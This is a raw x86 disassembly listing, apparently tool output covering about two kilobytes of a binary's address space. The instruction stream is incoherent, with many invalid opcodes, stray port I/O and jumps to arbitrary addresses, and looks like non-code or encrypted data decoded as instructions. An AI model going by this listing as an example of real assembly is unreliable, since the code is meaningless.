  423ca1:	cmp    ebp,DWORD PTR [esi+ebp*4]
  423ca4:	inc    esp
  423ca5:	mov    esi,0x3766994d
  423caa:	push   eax
  423cab:	mov    ebp,0x7bf105a4
  423cb0:	fincstp 
  423cb2:	fs std 
  423cb4:	xchg   BYTE PTR [edx],bl
  423cb6:	mov    cl,BYTE PTR [ebp-0x1]
  423cb9:	cmp    eax,DWORD PTR [ebp-0x7a]
  423cbc:	sbb    esi,esp
  423cbe:	sub    ebp,eax
  423cc0:	sahf   
  423cc1:	fbstp  TBYTE PTR [esi+eiz*8-0xd]
  423cc5:	xor    ah,BYTE PTR [ebp-0x56]
  423cc8:	or     bh,BYTE PTR [ebx]
  423cca:	xor    BYTE PTR [ebx-0x56e5e085],al
  423cd0:	pop    eax
  423cd1:	cwde   
  423cd2:	out    dx,eax
  423cd3:	(bad)  
  423cd4:	sbb    edi,edi
  423cd6:	sbb    eax,0xeee2033d
  423cdb:	cdq    
  423cdc:	fstp   QWORD PTR [ebx-0x33]
  423cdf:	lea    eax,ss:[ecx+0x367cfd80]
  423ce6:	adc    al,0x18
  423ce8:	pop    edx
  423ce9:	shl    BYTE PTR ds:0xed14b6e2,cl
  423cef:	and    eax,0x38451145
  423cf4:	repz dec eax
  423cf6:	shl    DWORD PTR [edx+0x79f6148e],0x71
  423cfd:	cmp    al,0xee
  423cff:	ins    DWORD PTR es:[edi],dx
  423d00:	mov    ch,0x26
  423d02:	lea    esi,ds:0x93bb1cdf
  423d08:	data16 (bad) 
  423d0b:	shr    BYTE PTR [eax],cl
  423d0d:	cmp    DWORD PTR [ebx+0x78177e89],edx
  423d13:	sub    ebx,DWORD PTR [eax+0x5f]
  423d16:	rol    BYTE PTR [ebp-0x6d266bd4],1
  423d1c:	test   BYTE PTR [ecx-0x59989467],0xd2
  423d23:	out    0x0,al
  423d25:	add    BYTE PTR [eax],al
  423d27:	add    BYTE PTR [eax],al
  423d29:	add    BYTE PTR [edx+edx*2+0x57],al
  423d2d:	push   ebp
  423d2e:	push   edi
  423d2f:	push   ebp
  423d30:	inc    esi
  423d31:	push   ebx
  423d32:	test   BYTE PTR [eax+0x6613fe6e],ah
  423d38:	sahf   
  423d39:	addr16 push 0x820001cb
  423d3f:	push   es
  423d40:	add    BYTE PTR [eax],al
  423d42:	scas   eax,DWORD PTR es:[edi]
  423d43:	pop    eax
  423d44:	retf   
  423d45:	push   0xffffffa2
  423d47:	mov    dl,BYTE PTR ds:0xda5091ed
  423d4d:	je     0x423ce0
  423d4f:	mov    dl,0x76
  423d51:	in     eax,0x33
  423d53:	add    DWORD PTR [edx],esi
  423d55:	push   cs
  423d56:	mov    eax,ds:0x4ff3dd44
  423d5b:	cmp    ah,0x6a
  423d5e:	or     cl,bh
  423d60:	outs   dx,DWORD PTR ds:[esi]
  423d61:	mov    edx,0xe0a5175d
  423d66:	sub    eax,0x3b360ee8
  423d6b:	iret   
  423d6c:	fdivr  QWORD PTR [eax+0x17]
  423d70:	call   0xfc28adfa
  423d75:	pop    ebp
  423d76:	jl     0x423d3d
  423d78:	mov    eax,ds:0x9cb38f81
  423d7d:	mov    ebx,0x41f1dfce
  423d82:	xchg   esi,eax
  423d83:	sub    al,0x2f
  423d85:	ja     0x423d9a
  423d87:	cmp    eax,0xe84845a7
  423d8c:	fwait
  423d8d:	inc    ebp
  423d8e:	mov    esi,0x730069e8
  423d93:	cmp    DWORD PTR [ecx+0x62],0xffffff8b
  423d97:	cmp    DWORD PTR [ebp+0x7a],esi
  423d9a:	dec    ecx
  423d9b:	adc    esi,DWORD PTR [eax-0xb]
  423d9e:	lea    ebp,[esi+edi*2]
  423da1:	mov    esp,0x1a964834
  423da6:	out    dx,eax
  423da7:	sbb    BYTE PTR [esi],ch
  423da9:	inc    ebx
  423daa:	xor    dl,al
  423dac:	jb     0x423ddc
  423dae:	add    ebp,DWORD PTR [ebp+0x9c796a]
  423db4:	dec    ecx
  423db5:	and    eax,0x8df9b02e
  423dba:	lahf   
  423dbb:	hlt    
  423dbc:	aas    
  423dbd:	out    0x1,eax
  423dbf:	pop    es
  423dc0:	mov    eax,ds:0x6c4ff380
  423dc5:	jp     0x423d55
  423dc7:	retf   0x145c
  423dca:	btr    esi,edi
  423dcd:	shr    DWORD PTR [eax-0x1a117b55],0xa9
  423dd4:	call   0x5217:0x6532bde5
  423ddb:	enter  0x5c94,0x3f
  423ddf:	(bad)  
  423de0:	mov    edx,0x6921710b
  423de5:	mov    eax,ds:0x6364571
  423dea:	inc    edx
  423deb:	push   ecx
  423dec:	pop    edx
  423ded:	popf   
  423dee:	inc    eax
  423def:	test   BYTE PTR [esi-0x19468ba9],ch
  423df5:	and    ecx,esp
  423df7:	pop    ebp
  423df8:	pop    ss
  423df9:	mov    bl,0xf9
  423dfb:	ds scas al,BYTE PTR es:[edi]
  423dfd:	out    dx,eax
  423dfe:	xchg   esp,eax
  423dff:	int    0x9b
  423e01:	pop    ds
  423e02:	cwde   
  423e03:	inc    esp
  423e04:	push   ds
  423e05:	call   0x33b56f87
  423e0a:	fsubrp st(4),st
  423e0c:	daa    
  423e0d:	outs   dx,DWORD PTR ds:[esi]
  423e0e:	aam    0xa0
  423e10:	inc    cx
  423e12:	jmp    0xcbcc116d
  423e17:	std    
  423e18:	inc    esp
  423e19:	(bad)  
  423e1a:	in     al,dx
  423e1b:	pop    ebx
  423e1c:	mov    DWORD PTR [esi-0x7],esp
  423e1f:	jge    0x423df0
  423e21:	push   0xe7d1631d
  423e26:	lods   al,BYTE PTR ds:[esi]
  423e27:	inc    esi
  423e28:	pop    es
  423e29:	and    ah,BYTE PTR [eax+0x4c]
  423e2c:	test   BYTE PTR [eax],bh
  423e2e:	jno    0x423e4c
  423e30:	fisttp DWORD PTR [ebx+eax*4+0xd]
  423e34:	sub    al,0xd6
  423e36:	dec    esp
  423e37:	dec    esp
  423e38:	loope  0x423e42
  423e3a:	pop    ds
  423e3b:	xchg   esp,eax
  423e3c:	iret   
  423e3d:	xor    dh,BYTE PTR [eax]
  423e3f:	pusha  
  423e40:	shl    BYTE PTR [ebx],0xa
  423e43:	aad    0x10
  423e45:	xor    DWORD PTR [edx],eax
  423e47:	movaps XMMWORD PTR [ebp-0x70],xmm0
  423e4b:	test   BYTE PTR [eax],bl
  423e4d:	push   eax
  423e4e:	push   ecx
  423e4f:	test   al,0x65
  423e51:	or     al,0x40
  423e53:	mov    ebx,ebx
  423e55:	push   ecx
  423e56:	mov    ds:0x33c7864,al
  423e5b:	movq   mm5,QWORD PTR [ebx+0x27909173]
  423e62:	add    DWORD PTR [ecx+0x3b31999a],ebx
  423e68:	leave  
  423e69:	or     al,0xdd
  423e6b:	dec    ebx
  423e6c:	jnp    0x423e15
  423e6e:	fimul  DWORD PTR [eax-0x9cf9225]
  423e74:	mov    esi,0x75a7e65d
  423e79:	jge    0x423ed2
  423e7b:	retf   
  423e7c:	std    
  423e7d:	fmul   st(6),st
  423e7f:	cld    
  423e80:	es std 
  423e82:	sub    al,0x3a
  423e84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423e85:	jle    0x423e11
  423e87:	push   cs
  423e88:	cmp    dl,BYTE PTR [eax-0x56]
  423e8b:	les    esi,FWORD PTR [ebp-0x29]
  423e8e:	in     al,0x45
  423e90:	(bad)  
  423e92:	dec    ecx
  423e93:	inc    ebp
  423e94:	pop    ebx
  423e95:	enter  0x10ce,0xd6
  423e99:	loopne 0x423e91
  423e9b:	mov    ?,edx
  423e9d:	add    eax,0x2e1ac26e
  423ea2:	pop    ecx
  423ea3:	jmp    0x423e5e
  423ea5:	or     esi,eax
  423ea7:	ret    
  423ea8:	lods   al,BYTE PTR ds:[esi]
  423ea9:	aas    
  423eaa:	pop    ebp
  423eab:	fmul   st(1),st
  423ead:	je     0x423e4b
  423eaf:	ds das 
  423eb1:	push   esi
  423eb2:	ret    0xb14
  423eb5:	stc    
  423eb6:	ss inc edi
  423eb8:	cmp    edi,DWORD PTR [ecx+0x5b312cdb]
  423ebe:	icebp  
  423ebf:	lock xchg ecx,eax
  423ec1:	inc    esp
  423ec2:	clc    
  423ec3:	jo     0x423ef2
  423ec5:	mov    esp,0x5f1d1d8d
  423eca:	cld    
  423ecb:	xchg   BYTE PTR [edx+ebp*4],dh
  423ece:	rol    BYTE PTR [ecx+0x6e0e0205],0x2b
  423ed5:	ficomp DWORD PTR [ebx+0x14954130]
  423edb:	in     eax,0xfd
  423edd:	idiv   DWORD PTR ds:0x68ed2425
  423ee3:	ja     0x423ea1
  423ee5:	cld    
  423ee6:	cli    
  423ee7:	adc    eax,DWORD PTR [edi-0x716b2721]
  423eed:	jl     0x423e7a
  423eef:	bound  edx,QWORD PTR [ecx-0x2e]
  423ef2:	inc    esp
  423ef3:	outs   dx,DWORD PTR ds:[esi]
  423ef4:	leave  
  423ef5:	add    eax,0x66423252
  423efa:	fdiv   QWORD PTR [eax+0x7f59f1c9]
  423f00:	adc    al,0xe8
  423f02:	xor    DWORD PTR [ecx],0x706f4ef7
  423f08:	jmp    0xa86003b7
  423f0d:	or     DWORD PTR [edi],0xffffffbd
  423f10:	add    cl,BYTE PTR [ecx-0x5e4ccb23]
  423f16:	and    bh,BYTE PTR [edx+0x23]
  423f19:	xchg   esi,eax
  423f1a:	pop    edi
  423f1b:	(bad)  
  423f1c:	push   0x36
  423f1e:	adc    eax,0x774da78b
  423f23:	adc    BYTE PTR [edi],ah
  423f25:	lds    esp,FWORD PTR [esi+0x26]
  423f28:	sbb    dl,BYTE PTR [ebp-0x9]
  423f2b:	push   edi
  423f2c:	pop    esi
  423f2d:	push   0xd8a24de2
  423f32:	sub    bh,BYTE PTR [ebp-0x53]
  423f35:	mov    eax,0xcaba1232
  423f3a:	xor    eax,DWORD PTR [ecx-0xc]
  423f3d:	add    BYTE PTR [ecx-0x6041de98],0x77
  423f44:	fisub  WORD PTR [ecx+0x3496a7f8]
  423f4a:	push   ebx
  423f4b:	and    DWORD PTR [edi+0x4f6b7060],ebx
  423f51:	pusha  
  423f52:	sbb    cl,ah
  423f54:	mov    DWORD PTR [esi-0x59],eax
  423f57:	addr16 jmp 0xa0c1:0x172d74e3
  423f5f:	jbe    0x423fc1
  423f61:	add    esp,DWORD PTR [edx+0x68a5df2a]
  423f67:	push   ebp
  423f68:	popa   
  423f69:	(bad)  
  423f6a:	lods   eax,DWORD PTR ds:[esi]
  423f6b:	xchg   edi,eax
  423f6c:	je     0x423f5a
  423f6e:	mov    cl,0x4f
  423f70:	cs cmp cl,dl
  423f73:	mov    dh,0x9d
  423f75:	nop
  423f76:	cmp    dl,BYTE PTR [esi+0x5fde7b66]
  423f7c:	into   
  423f7d:	xor    BYTE PTR [eax],bl
  423f7f:	sub    BYTE PTR [eax],ch
  423f81:	hlt    
  423f82:	and    al,0x81
  423f84:	(bad)  [ecx+0x20ac6de4]
  423f8a:	sub    DWORD PTR [ebp+0x73bafbd2],esp
  423f90:	add    eax,0x8c3173ea
  423f95:	std    
  423f96:	scas   al,BYTE PTR es:[edi]
  423f97:	jl     0x423fc7
  423f99:	and    bl,BYTE PTR [edi-0x6b]
  423f9c:	test   eax,0xfd816387
  423fa1:	mov    edi,0x50023a89
  423fa6:	pop    es
  423fa7:	or     esi,DWORD PTR [eax+0x7a]
  423faa:	bound  esp,QWORD PTR [edi+0x5c4fe77a]
  423fb0:	or     BYTE PTR fs:[ebp-0x13],dh
  423fb4:	xchg   ebx,eax
  423fb5:	fild   WORD PTR [esi]
  423fb7:	nop
  423fb8:	cdq    
  423fb9:	stos   DWORD PTR es:[edi],eax
  423fba:	test   eax,0x39dec72e
  423fbf:	inc    eax
  423fc0:	jb     0x423f8a
  423fc2:	lds    edx,FWORD PTR ds:0xc3ade312
  423fc8:	inc    DWORD PTR [edx+eax*8-0xe]
  423fcc:	imul   ebp,DWORD PTR [ecx],0xffffffe7
  423fcf:	ror    DWORD PTR [ebx-0x36],cl
  423fd2:	and    esp,0x703c81f0
  423fd8:	inc    esp
  423fd9:	dec    edi
  423fda:	push   ebx
  423fdb:	push   es
  423fdc:	xor    al,0x30
  423fde:	xor    edx,ebx
  423fe0:	gs (bad) 
  423fe2:	in     eax,dx
  423fe3:	ja     0x423fd7
  423fe5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423fe6:	sub    ch,ah
  423fe8:	std    
  423fe9:	ds mov bl,0x79
  423fec:	lods   al,BYTE PTR ds:[esi]
  423fed:	push   ss
  423fee:	scas   al,BYTE PTR es:[edi]
  423fef:	mov    ds:0x36e4ba41,al
  423ff4:	xlat   BYTE PTR ds:[ebx]
  423ff5:	rcl    BYTE PTR [ebx],0x63
  423ff8:	inc    edx
  423ff9:	sub    eax,0xf4a5885b
  423ffe:	not    ch
  424000:	or     DWORD PTR [ebp-0x51dd19fe],edi
  424006:	cmp    eax,0xc35455d3
  42400b:	push   eax
  42400c:	jle    0x424016
  42400e:	mov    ebp,DWORD PTR [ebx+0x3c]
  424011:	aam    0xc4
  424013:	sbb    eax,edi
  424015:	jb     0x424010
  424017:	ret    
  424018:	std    
  424019:	ds jbe 0x424072
  42401c:	stc    
  42401d:	mul    BYTE PTR [edx-0x2161b29e]
  424023:	and    BYTE PTR [esp+eiz*4+0x30],al
  424027:	and    DWORD PTR [edi],0x60
  42402a:	mov    WORD PTR ds:0x1e47f5e5,cs
  424030:	in     eax,dx
  424031:	inc    esi
  424032:	(bad)  
  424033:	in     al,dx
  424034:	frstpm(287 only) 
  424036:	int    0x55
  424038:	enter  0x8ddf,0x76
  42403c:	lds    edx,FWORD PTR [ecx+0x63]
  42403f:	xor    eax,0x40dc5ef3
  424044:	mov    ah,BYTE PTR [edi]
  424046:	jb     0x424095
  424048:	push   ss
  424049:	sbb    esi,ebx
  42404b:	js     0x423fe3
  42404d:	xchg   ebx,eax
  42404e:	or     eax,0xfd0ecc5
  424053:	loopne 0x424039
  424055:	lahf   
  424056:	mov    dh,0xc9
  424058:	push   es
  424059:	or     al,0xe3
  42405b:	jmp    FWORD PTR [eax-0x24c30476]
  424061:	sahf   
  424062:	stos   DWORD PTR es:[edi],eax
  424063:	outs   dx,DWORD PTR ds:[esi]
  424064:	lods   eax,DWORD PTR ds:[esi]
  424065:	mov    esi,0xe921ee14
  42406a:	fdivp  st(6),st
  42406c:	shr    bl,cl
  42406e:	(bad)
  424071:	cmp    ebx,DWORD PTR [edx+0x2d4480b7]
  424077:	add    BYTE PTR [eax],bh
  424079:	push   es
  42407a:	in     al,0xe0
  42407c:	push   esp
  42407d:	jg     0x4240c9
  42407f:	les    edx,FWORD PTR [ebp+0x55b10eb6]
  424085:	ins    DWORD PTR es:[edi],dx
  424086:	retf   
  424087:	div    BYTE PTR [esi-0x12fda13]
  42408d:	es hlt 
  42408f:	add    DWORD PTR [esi],esi
  424091:	xor    BYTE PTR [edi-0x70928328],0x26
  424098:	popa   
  424099:	jp     0x424073
  42409b:	adc    DWORD PTR [edx+edi*2],ecx
  42409e:	loope  0x4240c0
  4240a0:	jnp    0x424080
  4240a2:	(bad)  
  4240a3:	pop    edx
  4240a4:	out    0xf8,al
  4240a6:	(bad)  
  4240a7:	mov    esi,0xf1d057dd
  4240ac:	loop   0x4240d6
  4240ae:	popa   
  4240af:	inc    esp
  4240b0:	xor    DWORD PTR [edx],ecx
  4240b2:	mov    ah,0xe4
  4240b4:	loop   0x42408b
  4240b6:	test   eax,0x6a44a33a
  4240bb:	sahf   
  4240bc:	sbb    esi,esp
  4240be:	sbb    al,0x56
  4240c0:	or     eax,0xa18672d5
  4240c5:	popa   
  4240c6:	push   ds
  4240c7:	jb     0x42406f
  4240c9:	dec    esp
  4240ca:	cmp    eax,esp
  4240cc:	nop
  4240cd:	fsubp  st(4),st
  4240cf:	xor    al,0xe9
  4240d1:	xchg   esp,eax
  4240d2:	and    bl,bh
  4240d4:	add    dh,BYTE PTR [ecx-0x64156474]
  4240da:	popa   
  4240db:	dec    edi
  4240dc:	inc    ebp
  4240dd:	mov    edi,0x85579881
  4240e2:	sub    bh,ch
  4240e4:	push   ss
  4240e5:	cwde   
  4240e6:	lock add cl,al
  4240e9:	and    BYTE PTR [esi-0x63],dh
  4240ec:	mov    ebx,0x9d08b510
  4240f1:	pop    es
  4240f2:	aam    0xb1
  4240f4:	adc    edx,DWORD PTR [esi-0x15]
  4240f7:	xor    eax,0x9cecf5e1
  4240fc:	push   0x4adfed34
  424101:	sub    DWORD PTR [ebx],0x792b8bef
  424107:	scas   al,BYTE PTR es:[edi]
  424108:	pop    es
  424109:	lods   eax,DWORD PTR ds:[esi]
  42410a:	out    0xd5,al
  42410c:	pop    es
  42410d:	mov    bh,0x80
  42410f:	test   BYTE PTR [edx+0x1c38dcec],dh
  424115:	stos   DWORD PTR es:[edi],eax
  424116:	dec    ebx
  424117:	mov    edx,0x1570e1cf
  42411c:	fistp  DWORD PTR ds:[ebp-0x242e62a]
  424123:	(bad)  
  424125:	shr    DWORD PTR [edi+0x16],1
  424128:	sahf   
  424129:	test   DWORD PTR [esi-0x314b8790],edx
  42412f:	sbb    al,0x80
  424131:	jp     0x42412e
  424133:	sbb    eax,0xf832980d
  424138:	mov    dl,0xdb
  42413a:	sbb    ebp,DWORD PTR ds:0x40ae46b4
  424140:	jns    0x42417a
  424142:	gs dec ebx
  424144:	cmp    al,BYTE PTR [esp+esi*4]
  424147:	cs dec edi
  424149:	lods   eax,DWORD PTR es:[esi]
  42414b:	mov    ds:0xd91bce2e,al
  424150:	nop
  424151:	adc    eax,0xd48084cf
  424156:	and    DWORD PTR [ebx],edi
  424158:	sbb    al,0x88
  42415a:	pop    ebp
  42415b:	sbb    al,0x48
  42415d:	call   0xff206864
  424162:	dec    BYTE PTR [ecx+0x43449505]
  424168:	sub    BYTE PTR [esi+0x38],dl
  42416b:	adc    al,0x20
  42416d:	xchg   esi,eax
  42416e:	std    
  42416f:	pop    edx
  424170:	and    eax,0x8c22ae28
  424175:	or     bh,BYTE PTR [ecx+0x7099719a]
  42417b:	mov    edx,0x2dde0ff5
  424180:	mov    bl,0x63
  424182:	and    DWORD PTR [eax+0x7fa61636],ebp
  424188:	cdq    
  424189:	add    ebp,DWORD PTR [ecx+0x7d]
  42418c:	ins    BYTE PTR es:[edi],dx
  42418d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42418e:	daa    
  42418f:	shl    bh,1
  424191:	mov    edi,0x108b0ca1
  424196:	inc    ecx
  424197:	test   al,0xcf
  424199:	xchg   ecx,eax
  42419a:	repnz fwait
  42419c:	dec    ecx
  42419d:	in     eax,0xf8
  42419f:	mov    bh,0xb8
  4241a1:	adc    dh,BYTE PTR [esi+0x61e3b6d9]
  4241a7:	mov    dl,0xf7
  4241a9:	cli    
  4241aa:	pop    es
  4241ab:	lea    ebx,[edx+ebx*8+0x4]
  4241af:	test   al,0x1b
  4241b1:	loope  0x4241e7
  4241b3:	xor    eax,0x567d9aed
  4241b8:	mov    BYTE PTR [edx],ah
  4241ba:	add    eax,0x8d4ae2db
  4241bf:	out    dx,al
  4241c0:	pop    edx
  4241c1:	es mov cl,0xbe
  4241c4:	or     cl,BYTE PTR [edx+0x192aea05]
  4241ca:	push   ss
  4241cb:	test   BYTE PTR [esp+esi*4-0x2cadbb8e],ch
  4241d2:	(bad)  
  4241d3:	fadd   QWORD PTR [esi]
  4241d5:	inc    esp
  4241d6:	and    DWORD PTR [edx+0x63],esi
  4241d9:	es iret 
  4241db:	or     eax,esp
  4241dd:	mov    eax,esi
  4241df:	repnz push 0x85ddd742
  4241e5:	gs (bad) 
  4241e7:	sub    DWORD PTR ds:0x37703d6a,ebx
  4241ed:	cli    
  4241ee:	sbb    BYTE PTR [esi-0x17],bh
  4241f1:	xlat   BYTE PTR ds:[ebx]
  4241f2:	xchg   BYTE PTR [edx],ah
  4241f4:	mov    ebp,esi
  4241f6:	push   ds
  4241f7:	addr16 jb 0x424240
  4241fa:	aas    
  4241fb:	xchg   BYTE PTR [ecx+0x14191fa9],ch
  424201:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424202:	std    
  424203:	ins    BYTE PTR es:[edi],dx
  424204:	dec    esp
  424205:	pop    ds
  424206:	imul   ebx,DWORD PTR [eax],0x65
  424209:	inc    edi
  42420a:	adc    al,0x7
  42420c:	pop    esp
  42420d:	mov    ecx,0x47067721
  424212:	pop    esi
  424213:	xor    DWORD PTR [ebp+edx*1+0x7956ca8c],edx
  42421a:	dec    esi
  42421b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42421c:	jbe    0x424226
  42421e:	mov    bh,BYTE PTR [edx+0x66bbe528]
  424224:	(bad)  
  424225:	sub    al,0xfe
  424227:	inc    ebx
  424228:	test   BYTE PTR [edx+0x44],0x7a
  42422c:	out    dx,al
  42422d:	mov    al,0x77
  42422f:	adc    al,0x73
  424231:	cmp    ebp,DWORD PTR [edi-0x614d29dc]
  424237:	adc    esi,DWORD PTR [ebp+0x256bb4c8]
  42423d:	test   DWORD PTR [ebp+0x26ab450a],ecx
  424243:	popa   
  424244:	hlt    
  424245:	push   edi
  424246:	adc    BYTE PTR [edx-0x11],0xd6
  42424a:	popw   ss
  42424c:	test   BYTE PTR [edx+edx*1-0x1a0066f],al
  424253:	popa   
  424254:	stos   BYTE PTR es:[edi],al
  424255:	lahf   
  424256:	dec    ebp
  424257:	mov    ah,0x9e
  424259:	repz add al,0x23
  42425c:	sbb    bl,BYTE PTR [ebx+0x29]
  42425f:	(bad)  
  424260:	mov    ah,0x8d
  424262:	inc    edx
  424263:	cmp    BYTE PTR [esi-0x57],bh
  424266:	addr16 cdq 
  424268:	push   es
  424269:	sbb    BYTE PTR [esi-0x1d],0xa5
  42426d:	push   ebp
  42426e:	xchg   DWORD PTR [ecx+0x24],ecx
  424271:	aaa    
  424272:	pop    ecx
  424273:	lds    edi,FWORD PTR [edi+0x21]
  424276:	iret   
  424277:	mov    bh,0x66
  424279:	jnp    0x42426d
  42427b:	sub    ebx,DWORD PTR [edi-0x654c2266]
  424281:	test   edi,edi
  424283:	jns    0x4242ec
  424285:	lds    eax,FWORD PTR [esi+0x2033b007]
  42428b:	push   ebp
  42428c:	ret    
  42428d:	arpl   WORD PTR [edi-0x491160ed],cx
  424293:	mov    ah,0xa8
  424295:	pop    ebp
  424296:	xor    cl,BYTE PTR [edx+ebx*4]
  424299:	cmc    
  42429a:	mov    ah,0x9d
  42429c:	mov    bl,0x69
  42429e:	cmp    ebp,DWORD PTR [edi-0xd]
  4242a1:	mov    DWORD PTR [edi+0xb3c63e5],esi
  4242a7:	pusha  
  4242a8:	(bad)  
  4242a9:	aam    0x6e
  4242ab:	sbb    edx,DWORD PTR [eax-0x32767428]
  4242b1:	mov    ah,0x79
  4242b3:	jg     0x424326
  4242b5:	test   al,0x60
  4242b7:	and    al,0x7b
  4242b9:	fs scas al,BYTE PTR es:[edi]
  4242bb:	sub    ecx,DWORD PTR [ecx+eax*8-0x4efd971e]
  4242c2:	xchg   ebp,eax
  4242c3:	fsub   DWORD PTR ds:0xcd4fbb79
  4242c9:	push   ds
  4242ca:	fnsave [eax]
  4242cc:	aas    
  4242cd:	xor    DWORD PTR [edx],edx
  4242cf:	lock and edx,ebx
  4242d2:	repz inc edx
  4242d4:	xor    edi,DWORD PTR [esi+0x3305435b]
  4242da:	pop    esi
  4242db:	sbb    cl,0x88
  4242de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242df:	push   ds
  4242e0:	cmp    ecx,ebx
  4242e2:	stos   DWORD PTR es:[edi],eax
  4242e3:	shl    dh,1
  4242e5:	scas   eax,DWORD PTR es:[edi]
  4242e6:	ins    DWORD PTR es:[edi],dx
  4242e7:	lea    ecx,[edx]
  4242e9:	mov    ecx,0x2b7a5a7
  4242ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4242ef:	lahf   
  4242f0:	jle    0x4242a4
  4242f2:	sub    DWORD PTR [esp+eax*2+0x3b],0xd61d2194
  4242fa:	cli    
  4242fb:	cmp    DWORD PTR [esi],ebx
  4242fd:	mov    al,0x3e
  4242ff:	imul   esi,DWORD PTR [esp+eax*8+0x9],0x38ead3d9
  424307:	jecxz  0x424372
  424309:	jo     0x42429d
  42430b:	cmovns edx,DWORD PTR [ecx-0x52538635]
  424312:	mov    edi,fs
  424314:	stc    
  424315:	cmp    eax,0xba4944ef
  42431a:	dec    eax
  42431b:	jmp    0x424398
  42431d:	imul   esi,eax,0xfffffff3
  424320:	pop    esi
  424321:	arpl   WORD PTR [edx+0x38],bp
  424324:	stos   BYTE PTR es:[edi],al
  424325:	por    mm7,QWORD PTR [esi-0x24]
  424329:	out    dx,eax
  42432a:	mov    ebx,0x68e87bd5
  42432f:	mov    bl,0xa4
  424331:	or     bl,BYTE PTR [eax+ecx*2-0x31]
  424335:	arpl   sp,di
  424337:	loope  0x4242c0
  424339:	add    BYTE PTR [ebp+ebp*2-0x10fec98e],dl
  424340:	and    dh,ch
  424342:	mov    edx,0x57a96a5a
  424347:	bound  ecx,QWORD PTR [edx*2-0x7ed26df7]
  42434e:	pop    ebp
  42434f:	mov    dh,0x7
  424351:	push   ebp
  424352:	call   0x873d:0xb78f530a
  424359:	into   
  42435a:	add    bl,BYTE PTR [ebp-0x6c24d383]
  424360:	inc    ecx
  424361:	or     BYTE PTR [eax+0x4c5bcad4],dl
  424367:	push   esp
  424368:	xchg   BYTE PTR [ecx+0x74],bh
  42436b:	xchg   ebx,eax
  42436c:	imul   eax,DWORD PTR [ebx+0xfbed926],0x33
  424373:	cmp    ebx,DWORD PTR [edi-0x19]
  424376:	sub    DWORD PTR [ecx],eax
  424378:	mov    ecx,0x9b97dec
  42437d:	and    BYTE PTR [ecx],ch
  42437f:	jb     0x4243c0
  424381:	int3   
  424382:	(bad)  
  424384:	inc    esp
  424385:	add    al,0x80
  424387:	jecxz  0x4243ef
  424389:	ins    BYTE PTR es:[edi],dx
  42438a:	add    BYTE PTR [ebp+0x9],ah
  42438d:	mov    ecx,0x2423e887
  424392:	ins    BYTE PTR es:[edi],dx
  424393:	arpl   WORD PTR [eax-0x56],di
  424396:	mov    ds,WORD PTR [eax]
  424398:	rol    BYTE PTR [ebx-0xd],cl
  42439b:	and    eax,0x95e83e90
  4243a0:	jl     0x4243e5
  4243a2:	iret   
  4243a3:	sti    
  4243a4:	retf   0xc5e7
  4243a7:	mov    ebp,0x6f04ac63
  4243ac:	xor    ch,0xa0
  4243af:	and    DWORD PTR [esp+ecx*8],esi
  4243b2:	imul   ebp,DWORD PTR [ebp+0x75],0x672218e
  4243b9:	dec    edx
  4243ba:	pop    eax
  4243bb:	int    0x5d
  4243bd:	loopne 0x4243ca
  4243bf:	fwait
  4243c0:	mov    eax,0x980a6
  4243c5:	add    BYTE PTR [eax],al
  4243c7:	add    BYTE PTR [eax],al
  4243c9:	add    BYTE PTR [edx+0x44],bl
  4243cc:	dec    esi
  4243cd:	inc    ecx
  4243ce:	pop    esi
  4243cf:	dec    ebx
  4243d0:	pop    edi
  4243d1:	pop    edi
  4243d2:	inc    edx
  4243d3:	cwde   
  4243d4:	inc    esi
  4243d5:	loop   0x424378
  4243d7:	outs   dx,DWORD PTR ds:[esi]
  4243d8:	push   esi
  4243d9:	sbb    ebp,edx
  4243db:	rol    DWORD PTR [ecx],1
  4243dd:	add    BYTE PTR [edx+0x32000006],al
  4243e3:	je     0x424444
  4243e5:	adc    DWORD PTR [edx-0x17decaec],ecx
  4243eb:	(bad)  
  4243ec:	mov    edx,0x1548d65e
  4243f1:	add    DWORD PTR [ebx],0x37
  4243f4:	call   0xc7e1ec84
  4243f9:	aam    0x54
  4243fb:	cmp    eax,0x96ff0855
  424400:	mov    ds:0xd16d3006,eax
  424405:	ret    
  424406:	adc    eax,0x8c6cbfc
  42440b:	mov    WORD PTR [edi+0x1b],es
  42440e:	xlat   BYTE PTR ds:[ebx]
  42440f:	cmp    al,BYTE PTR [eax-0x1c484cdd]
  424415:	and    eax,0x4beae727
  42441a:	jp     0x42440e
  42441c:	fs inc edx
  42441e:	inc    edx
  42441f:	cld    
  424420:	aam    0x11
  424422:	repz push ss
  424424:	adc    eax,0x2847d23e
  424429:	adc    esp,esi
  42442b:	pop    ds
  42442c:	rol    BYTE PTR [ebp+0x34],cl
  42442f:	jmp    0x4243cc
  424431:	arpl   WORD PTR ds:0xc862f290,sp
  424437:	ds jg  0x424430
  42443a:	or     edx,DWORD PTR [edi]
  42443c:	cmp    ch,BYTE PTR [edi+0x16cb50a4]
  424442:	outs   dx,DWORD PTR ds:[esi]
  424443:	mov    al,0xda
  424445:	push   DWORD PTR [eax]
  424447:	hlt    
  424448:	in     eax,dx
  424449:	jb     0x4244c7
  42444b:	jl     0x42444e
  42444d:	loope  0x4243e5
  42444f:	outs   dx,DWORD PTR ds:[esi]
  424450:	push   edx
  424451:	push   ecx
  424452:	push   0x38
  424454:	jns    0x424423
  424456:	push   ebp
  424457:	int    0x6
  424459:	in     eax,0xad
  42445b:	stos   DWORD PTR es:[edi],eax
  42445c:	lds    ebx,FWORD PTR [edi+edi*4]
  42445f:	test   DWORD PTR [edi-0xa56314f],0x787301b1
  424469:	fwait
  42446a:	cmp    dh,bl
  42446c:	fisub  WORD PTR [ecx]
  42446e:	out    0x16,ax
  424471:	mov    edx,0x691428b
  424476:	sbb    BYTE PTR [ecx],al
  424478:	sbb    eax,0x175de846
  42447d:	xchg   edx,eax
  42447e:	lods   eax,DWORD PTR ds:[esi]
  42447f:	test   DWORD PTR [edi],edx
  424481:	in     al,0x93
  424483:	fidivr DWORD PTR [eax+0x2f]
  424486:	mov    bl,0x3c
  424488:	enter  0xbf4c,0x5f
  42448c:	pushf  
  42448d:	mov    edx,0xfe259f8b
